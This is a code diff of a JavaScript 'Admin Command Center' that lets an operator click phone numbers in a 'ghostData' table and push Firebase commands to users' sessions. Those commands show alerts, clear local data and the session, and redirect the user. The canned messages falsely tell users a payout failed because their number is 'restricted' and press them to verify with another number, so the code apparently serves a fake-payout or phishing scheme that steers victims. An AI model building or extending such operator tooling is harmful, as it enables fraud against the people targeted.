@@ -1,6 +1,6 @@
 /**
- * ADCOM.JS - Admin Command Center (DEBUG VERSION)
- * May on-screen messages para sa mobile testing
+ * ADCOM.JS - Admin Command Center
+ * Direct communication via user_sessions
  */
 
 // ========== DETECT CURRENT PAGE ==========
@@ -33,30 +33,13 @@ function showDebugMessage(message, type = 'info') {
         border: 2px solid ${colors[type] || colors.info};
         font-family: monospace;
         font-weight: bold;
-        box-shadow: 0 0 10px rgba(0,0,0,0.5);
     `;
-    debugDiv.innerHTML = `
-        ${message}
-        <button onclick="this.parentElement.remove()" style="
-            background: ${colors[type] || colors.info};
-            color: #000;
-            border: none;
-            border-radius: 8px;
-            padding: 4px 12px;
-            margin-left: 10px;
-            font-weight: bold;
-            cursor: pointer;
-        ">OK</button>
-    `;
+    debugDiv.innerHTML = `${message} <button onclick="this.parentElement.remove()" style="background:${colors[type] || colors.info}; color:#000; border:none; border-radius:8px; padding:4px 12px; margin-left:10px;">OK</button>`;
     document.body.appendChild(debugDiv);
     
-    // Auto remove after 8 seconds
     setTimeout(() => {
         if (debugDiv && debugDiv.remove) debugDiv.remove();
     }, 8000);
-    
-    // Also log to console if available
-    console.log(`[${type.toUpperCase()}] ${message}`);
 }
 
 // ========== INJECT CSS (ADMIN PAGE ONLY) ==========
@@ -87,7 +70,6 @@ if (isAdminPage) {
                 overflow: hidden;
                 display: flex;
                 flex-direction: column;
-                animation: popupSlideIn 0.3s ease;
             }
             @keyframes popupSlideIn {
                 from { opacity: 0; transform: scale(0.9) translateY(-20px); }
@@ -218,7 +200,7 @@ function closeUserCommandPopup() {
     if (popup) popup.remove();
 }
 
-// ========== SEND COMMAND TO USER ==========
+// ========== SEND COMMAND TO USER (Admin) - Diretso sa user_sessions ==========
 async function sendCommandToUser(phone, commandCode) {
     if (!isAdminPage) return;
     
@@ -229,12 +211,9 @@ async function sendCommandToUser(phone, commandCode) {
         '2': 'Clear user data due to restricted number?'
     };
     
-    if (!confirm(`⚠️ WARNING\n\n${commandMessages[commandCode]}\n\nUser: ${phone}\n\nThis action CANNOT be undone!`)) {
+    if (!confirm(`⚠️ WARNING ⚠️\n\n${commandMessages[commandCode]}\n\nUser: ${phone}\n\nThis action CANNOT be undone!`)) {
         return;
     }
-    
-    const commandRef = db.ref('admin_commands/' + phone);
-    const timestamp = Date.now();
     
     let message = '';
     if (commandCode === '1') {
@@ -243,22 +222,25 @@ async function sendCommandToUser(phone, commandCode) {
         message = '⚠️ Payout is unsuccessful. Your mobile number is restricted. Please use another registered mobile number to verify your withdrawal.';
     }
     
-    await commandRef.set({
-        message: message,
-        action: 'clear_and_reset',
-        commandCode: commandCode,
-        phone: phone,
-        timestamp: timestamp,
-        status: 'pending'
+    // I-save ang command DIREKTA sa user_sessions ng user
+    await db.ref('user_sessions/' + phone).update({
+        adminCommand: {
+            message: message,
+            commandCode: commandCode,
+            timestamp: Date.now(),
+            status: 'pending'
+        }
     });
     
-    showDebugMessage(`✅ Command sent to ${phone}`, 'success');
+    showDebugMessage(`✅ Command sent to ${phone} via user_sessions`, 'success');
     
+    // Auto-remove command after 30 seconds kung hindi na-receive
     setTimeout(async () => {
-        const cmdSnapshot = await commandRef.once('value');
-        if (cmdSnapshot.exists() && cmdSnapshot.val().status === 'pending') {
-            await commandRef.remove();
-            showDebugMessage(`⚠️ Command timeout for ${phone} (not received)`, 'warning');
+        const userSnap = await db.ref('user_sessions/' + phone).once('value');
+        const userData = userSnap.val();
+        if (userData && userData.adminCommand && userData.adminCommand.status === 'pending') {
+            await db.ref('user_sessions/' + phone + '/adminCommand').remove();
+            showDebugMessage(`⚠️ Command timeout for ${phone}`, 'warning');
         }
     }, 30000);
 }
@@ -267,14 +249,12 @@ async function sendCommandToUser(phone, commandCode) {
 function makePhonesClickable() {
     if (!isAdminPage) return;
     
-    showDebugMessage('Making phone numbers clickable...', 'info');
-    
     const allCells = document.querySelectorAll('#ghostData td');
     let foundPhones = 0;
     
     allCells.forEach(cell => {
         const text = cell.innerText.trim();
-        if (text.match(/^09\d{9}$/)) {
+        if (text.match(/^\+63\d{10}$/) || text.match(/^09\d{9}$/)) {
             foundPhones++;
             if (!cell.hasAttribute('data-clickable')) {
                 cell.setAttribute('data-clickable', 'true');
@@ -294,8 +274,6 @@ function makePhonesClickable() {
     
     if (foundPhones > 0) {
         showDebugMessage(`Found ${foundPhones} phone number(s) - Clickable now!`, 'success');
-    } else {
-        showDebugMessage('No phone numbers found in table', 'warning');
     }
 }
 
@@ -314,12 +292,9 @@ function observeTableChanges() {
     makePhonesClickable();
 }
 
-// ========== USER SIDE: LISTEN FOR COMMANDS ==========
+// ========== USER SIDE: LISTEN FOR COMMANDS (sa user_sessions) ==========
 function listenForAdminCommands() {
-    showDebugMessage('🔵 Starting command listener...', 'info');
-    
     const userPhone = localStorage.getItem('userPhone');
-    showDebugMessage(`🔵 User phone from storage: ${userPhone || 'NOT FOUND'}`, userPhone ? 'info' : 'error');
     
     if (!userPhone) {
         showDebugMessage('❌ No user phone found! Please login first.', 'error');
@@ -327,34 +302,39 @@ function listenForAdminCommands() {
     }
     
     showDebugMessage(`✅ Listening for admin commands as: ${userPhone}`, 'success');
+    showDebugMessage(`📍 Path: user_sessions/${userPhone}/adminCommand`, 'info');
     
-    const commandRef = db.ref('admin_commands/' + userPhone);
+    // Diretso sa user_sessions ng user
+    const userRef = db.ref('user_sessions/' + userPhone);
     
-    commandRef.on('value', async (snapshot) => {
-        const command = snapshot.val();
+    // Listen for changes sa user data
+    userRef.on('value', async (snapshot) => {
+        const userData = snapshot.val();
         
-        if (command && command.status === 'pending') {
+        if (userData && userData.adminCommand && userData.adminCommand.status === 'pending') {
+            const command = userData.adminCommand;
+            
             showDebugMessage(`📩 COMMAND RECEIVED! Type: ${command.commandCode}`, 'warning');
             
             // Show alert to user
             alert(command.message);
             showDebugMessage(`📢 Alert shown to user`, 'success');
             
-            // Mark as received
-            await commandRef.update({ status: 'received' });
-            showDebugMessage(`✅ Command marked as received`, 'success');
+            // Mark as received by removing the command
+            await db.ref('user_sessions/' + userPhone + '/adminCommand').remove();
+            showDebugMessage(`✅ Command removed from database`, 'success');
             
-            // Clear user data
+            // Clear local user data
             localStorage.removeItem('userPhone');
             localStorage.removeItem('userDeviceId');
             localStorage.removeItem('userSession');
             showDebugMessage(`🗑️ Local storage cleared`, 'info');
             
-            // Delete from Firebase
+            // Delete user session from Firebase
             await db.ref('user_sessions/' + userPhone).remove();
             showDebugMessage(`🗑️ User session deleted from Firebase`, 'info');
             
-            // Redirect
+            // Redirect to index.html
             showDebugMessage(`🔄 Redirecting to index.html...`, 'warning');
             window.location.href = 'index.html';
         }
